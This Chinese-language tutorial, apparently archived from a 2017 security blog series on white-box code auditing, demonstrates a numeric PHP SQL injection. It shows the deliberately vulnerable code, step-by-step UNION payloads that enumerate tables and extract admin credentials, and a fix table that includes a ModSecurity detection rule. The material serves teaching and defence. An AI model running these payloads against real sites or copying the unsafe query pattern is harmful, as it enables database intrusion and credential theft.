---
title: 代码审计的艺术系列首篇：系统介绍代码审计方法论脑图，以 PHP 数值型 SQL 注入为切入点演示漏洞成因、UNION 联合查询利用及数据库敏感信息提取全流程
description: 本文作为『代码审计的艺术』系列首篇，系统梳理代码审计方法论脑图，涵盖 SQL 注入、代码/命令执行、文件操作、设计缺陷四大漏洞类别；以 PHP
  数值型 SQL 注入为切入点，完整演示因缺乏整型转换与单引号保护导致的漏洞成因、UNION 联合查询判断列数、提取数据库用户名、联合查询 admin 表获取管理员凭证的全流程利用链。
category: program-analysis
tags:
- 代码审计
- SQL注入
- PHP安全
- 白盒测试
- UNION注入
- 漏洞挖掘方法论
- 代码审计的艺术系列
- 数值型注入
- 联合查询
- 敏感信息提取
date: 2017-04-15
updated: '2026-11-17'
---
## 系列简介

『代码审计的艺术』系列由资深白帽子李斌（HackBraid）撰写，旨在将零散的漏洞挖掘经验沉淀为可复用、可传承的白盒审计方法论。本篇作为系列首篇，确立了整个系列的知识脉络：

- **SQL 注入**：数值型、字符型、宽字节、二次注入、报错注入、盲注、堆叠注入等变种
- **代码 && 命令执行**：`eval`、`assert`、`preg_replace/e`、反序列化、模板注入等
- **文件操作相关**：文件上传、文件包含、文件下载、任意文件删除、越权访问
- **设计缺陷**：逻辑漏洞、安装重装漏洞、全局防护盲点、变量覆盖、授权绕过

后续文章将逐类展开实战案例溯源，形成完整的代码审计知识体系。相关延伸页面可参考：
- [[code-audit-file-operation-vulnerabilities]] 文件操作漏洞挖掘方法论
- [[code-audit-file-upload-vulnerabilities]] 文件上传漏洞全链路审计
- [[code-audit-global-protection-blindspots]] 全局防护九大盲点深度解析
- [[code-audit-second-order-sqli]] 二次 SQL 注入成因与利用链
- [[code-audit-widebyte-sql-injection-iconv]] 宽字节注入原理与 POC 构造
- [[code-audit-installation-reinstallation-vulnerabilities]] 安装/重装逻辑缺陷四大典型类型

## 环境准备

| 项目 | 说明 |
|------|------|
| 知识储备 | PHP 基础、MySQL 入门 |
| 代码编辑器 | Notepad++ |
| 服务器环境 | WAMP（Windows + Apache + MySQL + PHP） |
| 测试代码 & SQL | 百度网盘分享（原文链接已失效，建议自行搭建同构环境复现） |

## 代码审计方法论脑图

原文配套脑图（文件名 `dc95d7c887ab6dd41d41bc5fa1e6b232.png`）已归档，核心分支如下：

```
代码审计方法论
├─ SQL注入
│  ├─ 数值型/字符型/搜索型/POST/HTTP Header/Cookie
│  ├─ 报错/布尔盲注/时间盲注/DNSLog 外带
│  ├─ 二次注入/宽字节注入/堆叠注入
│  └─ 全局防护绕过（addslashes/GPC/str_replace/stripslashes/编码转换/解码函数）
├─ 代码&&命令执行
│  ├─ 危险函数：eval/assert/preg_replace(e)/system/exec/shell_exec/passthru
│  ├─ 反序列化：PHP/Java/.NET 魔术方法/Gadget Chain
│  ├─ 模板注入：Jinja2/Twig/Smarty/FreeMarker/Velocity
│  └─ 动态代码加载：include/require/create_function
├─ 文件操作相关
│  ├─ 文件上传：前端绕过/Content-Type/黑白名单/解析漏洞/条件竞争
│  ├─ 文件包含：LFI/RFI/伪协议（php://filter/input/data/phar:///zip://）
│  ├─ 文件下载/删除：路径遍历/路径拼接缺陷/未授权访问
│  └─ 越权访问：水平越权/垂直越权/IDOR
└─ 设计缺陷
   ├─ 逻辑漏洞：密码重置/支付篡改/验证绕过/越权绑定
   ├─ 安装重装：无锁文件/步骤跳过/变量覆盖/缺失 exit
   ├─ 全局防护盲区：数组键名/SERVER变量/FILES变量/变量覆盖
   └─ 授权绕过：JWT 算法混淆/密钥爆破/kid 参数注入
```

> **提示**：脑图为系列总纲，后续每篇文章对应一个分支深度拆解。建议配合 [[xd-security-code-audit-notes-day50-57]]、[[logic-vulnerability-password-reset-audit]]、[[php-file-inclusion-vulnerability]]、[[webshell-comprehensive-guide]] 等页面形成立体知识网。

## 实战演示：PHP 数值型 SQL 注入全流程

### 缺陷代码溯源

```php
<?php
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary'");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");

// ① 直接从 $_GET 获取 id，未做整型转换
$id = isset($_GET['id']) ? $_GET['id'] : 1;

// ② SQL 语句拼接时无单引号保护，直接插入变量
$sql = "SELECT * FROM news WHERE id={$id}";
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

**漏洞成因**：
1. **缺乏类型强制转换**：`$id` 未经过 `(int)` 或 `intval()` 转换，攻击者可注入任意 SQL 片段
2. **SQL 拼接无引号保护**：数值型字段在拼接时若不加单引号，直接拼接变量即可闭合原查询条件
3. **使用废弃 `mysql_*` 扩展**：无预处理语句支持，无法从根本防御注入

> **对比参考**：[[java-preparedstatement-sql-injection-defense]] Java PreparedStatement 参数化查询防御原理；[[metinfo-612-sql-injection-analysis]] CMS 中利用常量绕过过滤器的实战案例。

### 漏洞验证与列数判断

| 步骤 | Payload | 预期现象 | 判断依据 |
|------|---------|----------|----------|
| 基线访问 | `?id=1` | 正常输出新闻标题/内容 | 确认功能正常 |
| 永真条件 | `?id=1 and 1=1` | 返回结果与基线一致 | 存在注入点 |
| 永假条件 | `?id=1 and 1=2` | 无内容返回/报错 | 进一步确认注入 |
| ORDER BY 列数探测 | `?id=1 order by 3` / `order by 4` | 3 正常、4 报错 | 确认查询列数为 3 |

> **技巧**：数值型注入可直接使用 `ORDER BY n` 判列，字符型需先闭合引号再拼接。

### UNION 联合查询利用链

#### 确定输出位（回显列）

```http
GET /sqltest/news.php?id=-1 union select 1,2,3
```

- 页面输出 `2` 和 `3` → 第 2、3 列为可利用输出位
- 对应执行 SQL：`SELECT * FROM news WHERE id=-1 UNION SELECT 1,2,3`

> **原理**：`-1` 使原查询无结果，`UNION` 将构造结果集合并，仅显示攻击者可控的后两列。

#### 提取数据库敏感信息

| 目标 | Payload | 关键函数/表 | 回显示例 |
|------|---------|-------------|----------|
| 数据库用户 | `?id=-1 union select 1,user(),3` | `user()` | `root@localhost` |
| 数据库版本 | `?id=-1 union select 1,@@version,3` | `@@version` | `5.5.40` |
| 当前数据库 | `?id=-1 union select 1,database(),3` | `database()` | `test` |
| 表名枚举 | `?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()` | `information_schema.tables` | `admin,news` |
| 列名枚举 | `?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin'` | `information_schema.columns` | `id,name,pass` |
| 管理员凭证 | `?id=-1 union select 1,2,concat(name,0x23,pass) from admin` | `concat()+十六进制分隔符` | `admin#e10adc3949ba59abbe56e057f20f883e` |

**实战要点**：
- 使用 `concat(col1, 0x23, col2)` 或 `group_concat()` 将多行/多列合并单行输出，适配单行回显限制
- `0x23` 为 `#` 的十六进制，作为字段分隔符便于后续提取
- 若目标表名/列名未知，需先查询 `information_schema` 元数据表枚举

> **扩展阅读**：
> - [[mysql-duplicate-entry-error-based-sqli]] 报错注入提取数据技巧
> - [[mysql-dnslog-injection-loadfile-unct]] 无回显场景下的 DNSLog 外带
> - [[ctfshow-web-sql-injection-bypass-basics]] 绕过 `intval()`/`正则`/`WAF` 的进阶技术
> - [[wecenter-v334-phar-deserialization-sqli]] 反序列化触发 SQL 注入的异构利用链

### 修复方案清单

| 层面 | 措施 | 代码示例 |
|------|------|----------|
| **参数化查询（首选）** | 使用 PDO / mysqli 预处理语句，彻底分离代码与数据 | `$stmt = $pdo->prepare("SELECT * FROM news WHERE id=?"); $stmt->execute([$id]);` |
| **类型强制转换** | 数值型参数显式转整型 | `$id = isset($_GET['id']) ? (int)$_GET['id'] : 1;` |
| **输入白名单/正则校验** | 业务层面限定合法格式 | `if (!ctype_digit($_GET['id'])) exit('invalid id');` |
| **最小权限数据库账号** | 网站库账号仅赋予 `SELECT/INSERT/UPDATE/DELETE`，禁止 `DROP/FILE/GRANT` | `GRANT SELECT,INSERT,UPDATE,DELETE ON test.* TO 'web_user'@'localhost' IDENTIFIED BY 'strong_pass';` |
| **错误信息不回显生产环境** | 关闭 `display_errors`，记录日志供内部排查 | `php.ini: display_errors=Off, log_errors=On` |
| **WAF/应用层防护** | 部署 ModSecurity/安全狗/云 WAF 作为纵深防御，不可替代代码修复 | `SecRule ARGS "@rx union.*select" "id:1001,phase:2,block,msg:'SQLi attempt'"` |

> **最佳实践**：参数化查询是**唯一**从根本消除 SQL 注入的方案；类型转换、校验、最小权限、错误回显控制均为**纵深防御**措施，需组合使用。

## 系列导航与关联资源

| 篇次 | 主题 | 关联知识库页面 |
|------|------|----------------|
| 第 1 篇（本文） | 方法论脑图 + 数值型 UNION 注入入门 | [[code-audit-file-operation-vulnerabilities]]、[[code-audit-global-protection-blindspots]] |
| 第 2 篇 | 字符型/搜索型/HTTP Header/Cookie 注入变种 | [[ctfshow-web-sql-injection-bypass-basics]]、[[thinkphp-field-method-sql-injection-bypass-360-safe3]] |
| 第 3 篇 | 报错注入/盲注/DNSLog 外带实战 | [[mysql-duplicate-entry-error-based-sqli]]、[[mysql-dnslog-injection-loadfile-unc]] |
| 第 4 篇 | 宽字节注入/`iconv` 编码转换绕过 | [[code-audit-widebyte-sql-injection-iconv]] |
| 第 5 篇 | 二次注入/全局防护绕过/`str_replace`/`stripslashes` 误用 | [[code-audit-second-order-sqli]]、[[code-audit-global-protection-blindspots]] |
| 第 6 篇 | 文件上传/文件包含/文件下载/越权访问 | [[code-audit-file-upload-vulnerabilities]]、[[php-file-inclusion-vulnerability]]、[[code-audit-file-operation-vulnerabilities]] |
| 第 7 篇 | 代码/命令执行/`eval`/`assert`/反序列化/模板注入 | [[webshell-comprehensive-guide]]、[[python-pickle-deserialization-rce]]、[[python-ssti-multi-engine-bypass]] |
| 第 8 篇 | 逻辑漏洞/安装重装/变量覆盖/授权绕过 | [[logic-vulnerability-password-reset-audit]]、[[code-audit-installation-reinstallation-vulnerabilities]]、[[jwt漏洞原理与实战利用]] |

## 结语

本篇确立了**代码审计方法论总纲**，并以**最基础的数值型 UNION 注入**为切入点，完整演示了从**缺陷代码识别 → 漏洞验证 → 列数判断 → 输出位确定 → 敏感信息分级提取**的标准化白盒审计与黑盒利用全流程。后续文章将按脑图分支逐个击破，欢迎持续关注。

> **原文来源**：微信公众号归档文章《代码审计的艺术系列—第一篇》（作者：李斌 / 301 / HackBraid），发布于 2017 年左右。原文部分配图链接已失效，建议结合本页面文字描述在本地环境自行复现巩固。

## 来源

- [301在路上-201508-202208_148](../sources/301在路上-201508-202208_148.md)
